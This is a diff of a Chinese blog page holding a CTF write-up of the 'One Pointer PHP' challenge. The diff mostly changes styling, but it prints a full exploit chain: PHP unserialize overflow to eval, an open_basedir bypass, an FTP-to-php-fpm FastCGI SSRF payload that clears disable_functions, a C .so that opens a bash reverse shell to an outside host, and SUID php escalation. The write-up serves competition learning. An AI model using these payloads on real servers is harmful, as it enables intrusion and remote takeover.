@@ -5,8 +5,8 @@
 	<meta charset="UTF-8">
 	<meta name="viewport" content="width=device-width, initial-scale=1.0">
 	<meta http-equiv="X-UA-Compatible" content="ie=edge">
-	<meta name="theme-color" content="#494f5c">
-	<meta name="msapplication-TileColor" content="#494f5c">
+	<meta name="theme-color" content="#20293a">
+	<meta name="msapplication-TileColor" content="#20293a">
 <meta itemprop="name" content="蓝帽杯 One Pointer PHP">
 <meta itemprop="description" content="两个web，一个js小游戏代码审计1小时，玩10秒弹flag什么鬼，还有一个就是这道全场1解题。
 &lt;?php class User{ public $count; } if($user=unserialize($_COOKIE[&#34;data&#34;])){ $count[&#43;&#43;$user-&gt;count]=1; if($count[]=1){ $user-&gt;count&#43;=1; setcookie(&#34;data&#34;,serialize($user)); }else{ eval($_GET[&#34;backdoor&#34;]); } }else{ $user=new User; $user-&gt;count=1; setcookie(&#34;data&#34;,serialize($user)); } ?&gt;题目给了源码，第一关是数组溢出，需要$count[]=1，这一步赋值操作报错即可命令执行，貌似php的溢出长度和操作系统有关，我在本地尝试的时候2^31-1即可绕过，但题目上需要2*63-1，不过关系不大，然后蚁剑连上去即可。
@@ -16,8 +16,8 @@ putenv 居然被过滤了！前几天还专门研究了这个，不过在phpinfo
 &lt;?php mkdir(&#39;theoyu&#39;); chdir(&#39;theoyu&#39;); ini_set(&#39;open_basedir&#39;,&#39;..&#39;); chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;); ini_set(&#39;open_basedir&#39;,&#39;/&#39;); // 此处用来读目录 // $a = new DirectoryIterator(&#34;glob:///etc/nginx/sites-enabled/*&#34;); // foreach($a as $f){ // echo($f-&gt;__toString().&#39;&lt;br&gt;&#39;); // }  //此处用来读文件 echo file_get_contents(&#39;/etc/nginx/sites-enabled/default&#39;); ?&gt;这个读取过程也是很折磨，大概就是一点一点摸索吧，在配置文件发现了fastcgi的开放端口&hellip;然后就不会了&hellip;
 看wp发现师傅们用的是ftp 与 php-fpm 对话 RCE，具体可参考这一篇文章，后续我应该也会专门总结一篇关于fastcgi和fpm的文章。
 那有了ftp的对话，思路就很清晰了，通过本地vps起一个ftp服务，在靶机上将fpmRCE的payload发送给ftp，再又ftp转发给靶机的9001端口形成ssrf，不得不说实在太巧妙了。
-fastcgi 的攻击脚本有php和go的，经过测试都可以运行，在php_value 处把disable_function置空即可。有的师傅也利用了extension去加载**.so**反弹shell，不过我感觉既然蚁剑已经可以连接了，就不需要这一步。"><meta itemprop="datePublished" content="2021-05-04T21:30:20&#43;08:00" />
-<meta itemprop="dateModified" content="2021-05-04T21:30:20&#43;08:00" />
+fastcgi 的攻击脚本有php和go的，经过测试都可以运行，在php_value 处把disable_function置空即可。有的师傅也利用了extension去加载**.so**反弹shell，不过我感觉既然蚁剑已经可以连接了，就不需要这一步。"><meta itemprop="datePublished" content="2021-05-04T21:30:20+08:00" />
+<meta itemprop="dateModified" content="2021-05-04T21:30:20+08:00" />
 <meta itemprop="wordCount" content="1306">
 <meta itemprop="keywords" content="" /><meta property="og:title" content="蓝帽杯 One Pointer PHP" />
 <meta property="og:description" content="两个web，一个js小游戏代码审计1小时，玩10秒弹flag什么鬼，还有一个就是这道全场1解题。
@@ -31,8 +31,8 @@ putenv 居然被过滤了！前几天还专门研究了这个，不过在phpinfo
 fastcgi 的攻击脚本有php和go的，经过测试都可以运行，在php_value 处把disable_function置空即可。有的师傅也利用了extension去加载**.so**反弹shell，不过我感觉既然蚁剑已经可以连接了，就不需要这一步。" />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://theoyu.top/posts/bluehat/" /><meta property="article:section" content="posts" />
-<meta property="article:published_time" content="2021-05-04T21:30:20&#43;08:00" />
-<meta property="article:modified_time" content="2021-05-04T21:30:20&#43;08:00" />
+<meta property="article:published_time" content="2021-05-04T21:30:20+08:00" />
+<meta property="article:modified_time" content="2021-05-04T21:30:20+08:00" />
 
 <meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="蓝帽杯 One Pointer PHP"/>
@@ -54,7 +54,7 @@ fastcgi 的攻击脚本有php和go的，经过测试都可以运行，在php_val
 	<link rel="shortcut icon" href="/favicon.ico">
 
 	<title>蓝帽杯 One Pointer PHP</title>
-	<link rel="stylesheet" href="https://theoyu.top/css/style.min.30fdc0da2239aa820f96432ceb94fffac062559579f2544e381335700f6891d0.css" integrity="sha256-MP3A2iI5qoIPlkMs65T/+sBiVZV58lROOBM1cA9okdA=" crossorigin="anonymous">
+	<link rel="stylesheet" href="https://theoyu.top/css/style.min.948bbb56de2e03535e20f1dcdeada9d463fac9cb3e67a99667928e9208ec6fa8.css" integrity="sha256-lIu7Vt4uA1NeIPHc3q2p1GP6ycs+Z6mWZ5KOkgjsb6g=" crossorigin="anonymous">
 	
 </head>
 
@@ -74,7 +74,7 @@ fastcgi 的攻击脚本有php和go的，经过测试都可以运行，在php_val
 				</nav>
 			</div>
 			<div class="hdr-right hdr-icons">
-				<span class="hdr-social hide-in-mobile"><a href="mailto:zeyu.ou@outlook.com" target="_blank" rel="noopener me" title="Email"><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path><polyline points="22,6 12,13 2,6"></polyline></svg></a><a href="https://instagram.com/" target="_blank" rel="noopener me" title="Instagram"><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="2" width="20" height="20" rx="5" ry="5"></rect><path d="M16 11.37A4 4 0 1 1 12.63 8 4 4 0 0 1 16 11.37z"></path><line x1="17.5" y1="6.5" x2="17.5" y2="6.5"></line></svg></a><a href="https://github.com/" target="_blank" rel="noopener me" title="Github"><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path></svg></a></span><button id="menu-btn" class="hdr-btn" title=""><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-menu"><line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="18" x2="21" y2="18"></line></svg></button>
+				<span class="hdr-social hide-in-mobile"><a href="mailto:zeyu.ou@foxmail.com" target="_blank" rel="noopener me" title="Email"><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path><polyline points="22,6 12,13 2,6"></polyline></svg></a><a href="https://instagram.com/" target="_blank" rel="noopener me" title="Instagram"><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="2" width="20" height="20" rx="5" ry="5"></rect><path d="M16 11.37A4 4 0 1 1 12.63 8 4 4 0 0 1 16 11.37z"></path><line x1="17.5" y1="6.5" x2="17.5" y2="6.5"></line></svg></a><a href="https://github.com/yuuuuu422" target="_blank" rel="noopener me" title="Github"><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path></svg></a></span><button id="menu-btn" class="hdr-btn" title=""><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-menu"><line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="18" x2="21" y2="18"></line></svg></button>
 			</div>
 		</div>
 	</header>
@@ -94,7 +94,7 @@ fastcgi 的攻击脚本有php和go的，经过测试都可以运行，在php_val
 			</header>
 			<div class="content">
 				<p>两个web，一个js小游戏代码审计1小时，玩10秒弹flag什么鬼，还有一个就是这道全场1解题。</p>
-<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
 <span class="k">class</span> <span class="nc">User</span><span class="p">{</span>
 	<span class="k">public</span> <span class="nv">$count</span><span class="p">;</span>
 <span class="p">}</span>
@@ -121,7 +121,7 @@ data=O%3a4%3a&quot;User&quot;%3a1%3a{s%3a5%3a&quot;count&quot;%3bi%3a92233720368
 <p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-05-image-20210505180925973.png" alt="image-20210505180925973"></p>
 <p><strong>putenv</strong> 居然被过滤了！前几天还专门研究了这个，不过在<strong>phpinfo()</strong> 中发现<strong>Server API =FPM/FastCGI</strong> ，之前学<strong>SSRF</strong> 的时候有接触过这个，可以通过这个RCE，但好像根本没有ssrf的入口..思绪在这里就断了</p>
 <p>好像没啥会的了，就尝试读一下配置文件，读取方式如下：</p>
-<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
 <span class="nx">mkdir</span><span class="p">(</span><span class="s1">&#39;theoyu&#39;</span><span class="p">);</span>
 <span class="nx">chdir</span><span class="p">(</span><span class="s1">&#39;theoyu&#39;</span><span class="p">);</span>
 <span class="nx">ini_set</span><span class="p">(</span><span class="s1">&#39;open_basedir&#39;</span><span class="p">,</span><span class="s1">&#39;..&#39;</span><span class="p">);</span>
@@ -143,7 +143,7 @@ data=O%3a4%3a&quot;User&quot;%3a1%3a{s%3a5%3a&quot;count&quot;%3bi%3a92233720368
 <p>看wp发现师傅们用的是<strong>ftp 与 php-fpm 对话 RCE</strong>，具体可参考<a href="https://www.anquanke.com/post/id/233454">这一篇文章</a>，后续我应该也会专门总结一篇关于fastcgi和fpm的文章。</p>
 <p>那有了ftp的对话，思路就很清晰了，通过本地vps起一个ftp服务，在靶机上将<strong>fpmRCE</strong>的payload发送给ftp，再又ftp转发给靶机的9001端口形成ssrf，不得不说实在太巧妙了。</p>
 <p><strong>fastcgi</strong> 的攻击脚本有php和go的，经过测试都可以运行，在<strong>php_value</strong> 处把<strong>disable_function</strong>置空即可。有的师傅也利用了extension去加载**.so**反弹shell，不过我感觉既然蚁剑已经可以连接了，就不需要这一步。</p>
-<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
 
 <span class="k">class</span> <span class="nc">FCGIClient</span>
 <span class="p">{</span>
@@ -388,7 +388,7 @@ data=O%3a4%3a&quot;User&quot;%3a1%3a{s%3a5%3a&quot;count&quot;%3bi%3a92233720368
 </span><span class="err">?&gt;
 </span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-05-image-20210505184651947.png" alt="image-20210505184651947"></p>
 <p>然后在vps上起ftp：</p>
-<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">socket</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">socket</span>
 <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span> 
 <span class="n">s</span><span class="o">.</span><span class="n">bind</span><span class="p">((</span><span class="s1">&#39;0.0.0.0&#39;</span><span class="p">,</span> <span class="mi">12345</span><span class="p">))</span>
 <span class="n">s</span><span class="o">.</span><span class="n">listen</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
@@ -415,12 +415,12 @@ data=O%3a4%3a&quot;User&quot;%3a1%3a{s%3a5%3a&quot;count&quot;%3bi%3a92233720368
 <span class="c1">#QUIT</span>
 <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;221 Goodbye.</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
 <span class="n">conn</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
-</code></pre></div><div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">/add_api.php?backdoor<span class="o">=</span><span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="o">[</span><span class="s1">&#39;file&#39;</span><span class="o">]</span><span class="p">;</span><span class="nv">$data</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="o">[</span><span class="s1">&#39;data&#39;</span><span class="o">]</span><span class="p">;</span>file_put_contents<span class="o">(</span><span class="nv">$file</span>,<span class="nv">$data</span><span class="o">)</span><span class="p">;&amp;</span><span class="nv">file</span><span class="o">=</span>ftp://ip:12345/<span class="p">&amp;</span><span class="nv">data</span><span class="o">=</span>%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%021%00%00%11%0BGATEWAY_INTERFACEFastCGI%2F1.0%0E%04REQUEST_METHODPOST%0F%19SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Fadd_api.php%0B%0CSCRIPT_NAME%2Fadd_api.php%0C%0EQUERY_STRINGcommand%3Dwhoami%0B%1BREQUEST_URI%2Fadd_api.php%3Fcommand%3Dwhoami%0C%0CDOCUMENT_URI%2Fadd_api.php%09%80%00%00%A5PHP_VALUEunserialize_callback_func+%3D+system%0Aextension_dir+%3D+%2Fvar%2Fwww%2Fhtml%0Adisable_classes+%3D+%0Adisable_functions+%3D+%0Aallow_url_include+%3D+On%0Aopen_basedir+%3D+%2F%0Aauto_prepend_file+%3D+%0F%0DSERVER_SOFTWARE80sec%2Fwofeiwo%0B%09REMOTE_ADDR127.0.0.1%0B%04REMOTE_PORT9001%0B%09SERVER_ADDR127.0.0.1%0B%02SERVER_PORT80%0B%09SERVER_NAMElocalhost%0F%08SERVER_PROTOCOLHTTP%2F1.1%0E%02CONTENT_LENGTH49%01%04%00%01%00%00%00%00%01%05%00%01%001%00%00%3C%3Fphp+system%28%24_REQUEST%5B%27command%27%5D%29%3B+phpinfo%28%29%3B+%3F%3E%01%05%00%01%00%00%00%00
+</code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">/add_api.php?backdoor<span class="o">=</span><span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="o">[</span><span class="s1">&#39;file&#39;</span><span class="o">]</span><span class="p">;</span><span class="nv">$data</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="o">[</span><span class="s1">&#39;data&#39;</span><span class="o">]</span><span class="p">;</span>file_put_contents<span class="o">(</span><span class="nv">$file</span>,<span class="nv">$data</span><span class="o">)</span><span class="p">;&amp;</span><span class="nv">file</span><span class="o">=</span>ftp://ip:12345/<span class="p">&amp;</span><span class="nv">data</span><span class="o">=</span>%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%021%00%00%11%0BGATEWAY_INTERFACEFastCGI%2F1.0%0E%04REQUEST_METHODPOST%0F%19SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Fadd_api.php%0B%0CSCRIPT_NAME%2Fadd_api.php%0C%0EQUERY_STRINGcommand%3Dwhoami%0B%1BREQUEST_URI%2Fadd_api.php%3Fcommand%3Dwhoami%0C%0CDOCUMENT_URI%2Fadd_api.php%09%80%00%00%A5PHP_VALUEunserialize_callback_func+%3D+system%0Aextension_dir+%3D+%2Fvar%2Fwww%2Fhtml%0Adisable_classes+%3D+%0Adisable_functions+%3D+%0Aallow_url_include+%3D+On%0Aopen_basedir+%3D+%2F%0Aauto_prepend_file+%3D+%0F%0DSERVER_SOFTWARE80sec%2Fwofeiwo%0B%09REMOTE_ADDR127.0.0.1%0B%04REMOTE_PORT9001%0B%09SERVER_ADDR127.0.0.1%0B%02SERVER_PORT80%0B%09SERVER_NAMElocalhost%0F%08SERVER_PROTOCOLHTTP%2F1.1%0E%02CONTENT_LENGTH49%01%04%00%01%00%00%00%00%01%05%00%01%001%00%00%3C%3Fphp+system%28%24_REQUEST%5B%27command%27%5D%29%3B+phpinfo%28%29%3B+%3F%3E%01%05%00%01%00%00%00%00
 </code></pre></div><p>打过去，看vps上的ftp断开，说明对话成功，回头看一眼<strong>phpinfo()</strong>:</p>
 <p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-05-image-20210505185334445.png" alt="image-20210505185334445"></p>
 <p>后面就好说了，然鹅当我打开蚁剑，发现还是什么也动不了，命令执行还是和之前一模一样&hellip;我傻了</p>
 <p>翻阅资料才发现伪造FastCGI请求PHP-CGI本身就是一次性的，相当于执行一次命令(之前gopher打ssrf那个脚本也是同理)，那最好的办法当然还是加载.so去打ssrf了&hellip;</p>
-<div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c"><span class="cp">#define _GNU_SOURCE
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="cp">#define _GNU_SOURCE
 </span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
 </span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
 </span><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
@@ -428,13 +428,13 @@ data=O%3a4%3a&quot;User&quot;%3a1%3a{s%3a5%3a&quot;count&quot;%3bi%3a92233720368
 <span class="n">__attribute__</span> <span class="p">((</span><span class="n">__constructor__</span><span class="p">))</span> <span class="kt">void</span> <span class="n">hack</span> <span class="p">(</span><span class="kt">void</span><span class="p">){</span>
     <span class="n">system</span><span class="p">(</span><span class="s">&#34;bash -c &#39;bash -i &gt;&amp; /dev/tcp/ip/8000 0&gt;&amp;1&#39;&#34;</span><span class="p">);</span>
 <span class="p">}</span>
-</code></pre></div><div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">gcc theoyu.c -shared -o theoyu.so 
+</code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">gcc theoyu.c -shared -o theoyu.so 
 </code></pre></div><p>把theoyu.so传到/var/www/html 目录后，再把之前脚本的php_value改为：</p>
-<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="nv">$php_value</span> <span class="o">=</span> <span class="s2">&#34;unserialize_callback_func = system</span><span class="se">\n</span><span class="s2">extension_dir = /var/www/html</span><span class="se">\n</span><span class="s2">extension = theoyu.so</span><span class="se">\n</span><span class="s2">disable_classes = </span><span class="se">\n</span><span class="s2">disable_functions = </span><span class="se">\n</span><span class="s2">allow_url_include = On</span><span class="se">\n</span><span class="s2">open_basedir = /</span><span class="se">\n</span><span class="s2">auto_prepend_file = &#34;</span><span class="p">;</span> <span class="c1">// extension_dir即为.so文件所在目录
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="nv">$php_value</span> <span class="o">=</span> <span class="s2">&#34;unserialize_callback_func = system</span><span class="se">\n</span><span class="s2">extension_dir = /var/www/html</span><span class="se">\n</span><span class="s2">extension = theoyu.so</span><span class="se">\n</span><span class="s2">disable_classes = </span><span class="se">\n</span><span class="s2">disable_functions = </span><span class="se">\n</span><span class="s2">allow_url_include = On</span><span class="se">\n</span><span class="s2">open_basedir = /</span><span class="se">\n</span><span class="s2">auto_prepend_file = &#34;</span><span class="p">;</span> <span class="c1">// extension_dir即为.so文件所在目录
 </span></code></pre></div><pre><code>/add_api.php?backdoor=$file = $_GET['file'];$data = $_GET['data'];file_put_contents($file,$data);&amp;file=ftp://ip:12345/&amp;data=%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%02G%00%00%11%0BGATEWAY_INTERFACEFastCGI%2F1.0%0E%04REQUEST_METHODPOST%0F%19SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Fadd_api.php%0B%0CSCRIPT_NAME%2Fadd_api.php%0C%0EQUERY_STRINGcommand%3Dwhoami%0B%1BREQUEST_URI%2Fadd_api.php%3Fcommand%3Dwhoami%0C%0CDOCUMENT_URI%2Fadd_api.php%09%80%00%00%BBPHP_VALUEunserialize_callback_func+%3D+system%0Aextension_dir+%3D+%2Fvar%2Fwww%2Fhtml%0Aextension+%3D+theoyu.so%0Adisable_classes+%3D+%0Adisable_functions+%3D+%0Aallow_url_include+%3D+On%0Aopen_basedir+%3D+%2F%0Aauto_prepend_file+%3D+%0F%0DSERVER_SOFTWARE80sec%2Fwofeiwo%0B%09REMOTE_ADDR127.0.0.1%0B%04REMOTE_PORT9001%0B%09SERVER_ADDR127.0.0.1%0B%02SERVER_PORT80%0B%09SERVER_NAMElocalhost%0F%08SERVER_PROTOCOLHTTP%2F1.1%0E%02CONTENT_LENGTH49%01%04%00%01%00%00%00%00%01%05%00%01%001%00%00%3C%3Fphp+system%28%24_REQUEST%5B%27command%27%5D%29%3B+phpinfo%28%29%3B+%3F%3E%01%05%00%01%00%00%00%00
 </code></pre><p>同时vps打开监听，反弹成功后终于可以动了。</p>
 <p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-05-image-20210505204851091.png" alt="image-20210505204851091"></p>
-<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">www-data@2be1b7732d18:/$ ls -al
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">www-data@2be1b7732d18:/$ ls -al
 total <span class="m">8</span>
 drwxr-xr-x    <span class="m">1</span> root root   <span class="m">78</span> May  <span class="m">5</span> 09:53 .
 drwxr-xr-x    <span class="m">1</span> root root   <span class="m">78</span> May  <span class="m">5</span> 09:53 ..
@@ -460,7 +460,7 @@ drwxrwxrwt    <span class="m">1</span> root root    <span class="m">6</span> May
 drwxr-xr-x    <span class="m">1</span> root root   <span class="m">19</span> Apr  <span class="m">8</span> 00:00 usr
 drwxr-xr-x    <span class="m">1</span> root root   <span class="m">39</span> Apr <span class="m">29</span> 14:53 var
 </code></pre></div><p>但是发现 <strong>/flag</strong>还是不能读取，之后就是一个简单的suid提权。</p>
-<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">www-data@2be1b7732d18:/$ find / -perm -u<span class="o">=</span>s -type f 2&gt;/dev/null
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">www-data@2be1b7732d18:/$ find / -perm -u<span class="o">=</span>s -type f 2&gt;/dev/null
 
 /bin/mount
 /bin/su
@@ -472,7 +472,7 @@ drwxr-xr-x    <span class="m">1</span> root root   <span class="m">39</span> Apr
 /usr/bin/passwd
 /usr/local/bin/php
 </code></pre></div><p>发现php就有s权限，直接写一个php执行读取即可。</p>
-<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
 <span class="nx">mkdir</span><span class="p">(</span><span class="s1">&#39;theoyu&#39;</span><span class="p">);</span>
 <span class="nx">chdir</span><span class="p">(</span><span class="s1">&#39;theoyu&#39;</span><span class="p">);</span>
 <span class="nx">ini_set</span><span class="p">(</span><span class="s1">&#39;open_basedir&#39;</span><span class="p">,</span><span class="s1">&#39;..&#39;</span><span class="p">);</span>
@@ -515,7 +515,7 @@ drwxr-xr-x    <span class="m">1</span> root root   <span class="m">39</span> Apr
 		</article>
 		<div class="post-nav thin">
 			<a class="next-post" href="https://theoyu.top/posts/2021/">
-				<span class="post-nav-label"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-arrow-left"><line x1="19" y1="12" x2="5" y2="12"></line><polyline points="12 19 5 12 12 5"></polyline></svg>&nbsp;</span><br><span>2021 WP汇总</span>
+				<span class="post-nav-label"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-arrow-left"><line x1="19" y1="12" x2="5" y2="12"></line><polyline points="12 19 5 12 12 5"></polyline></svg>&nbsp;</span><br><span>2021↑ WP汇总</span>
 			</a>
 			<a class="prev-post" href="https://theoyu.top/posts/disabled_function/">
 				<span class="post-nav-label">&nbsp;<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-arrow-right"><line x1="5" y1="12" x2="19" y2="12"></line><polyline points="12 5 19 12 12 19"></polyline></svg></span><br><span>利用LD_PRELOAD绕过disable_function</span>
